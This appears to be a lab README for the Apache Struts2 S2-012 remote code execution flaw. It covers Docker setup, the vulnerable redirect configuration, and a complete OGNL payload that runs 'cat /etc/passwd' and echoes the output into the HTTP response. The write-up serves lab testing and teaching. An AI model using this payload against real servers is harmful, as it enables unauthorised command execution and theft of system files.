# S2-012 Remote Code Execution Vulnerability

Impact version: 2.1.0 - 2.3.13

Vulnerability details: http://struts.apache.org/docs/s2-012.html

## Test environment construction

```
Docker-compose build
Docker-compose up -d
```

## Principle

If the Redirect type is used when configuring Result in Action , and ${param_name} is also used as the redirect variable, for example:

```xml
<package name="S2-012" extends="struts-default">
    <action name="user" class="com.demo.action.UserAction">
        <result name="redirect" type="redirect">/index.jsp?name=${name}</result>
        <result name="input">/index.jsp</result>
        <result name="success">/index.jsp</result>
    </action>
</package>
```

Here the UserAction defines a name variable. When the redirect type is triggered, Struts2 gets its value using ${name}. In this process, the OGNL expression is parsed for the value of the name parameter, so that any OGNL expression can be inserted. Causes command execution.

## Exp

You can directly evoke the echo POC in s2-001, because there is no sandbox and no special characters (why?).

```
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat", "/etc/passwd"})).redirectErrorStream(true).start(),#b=#a .getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e) , #f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter(). Flush(),#f.getWriter().close()}
```

Send a request and execute the command:

![](1.png)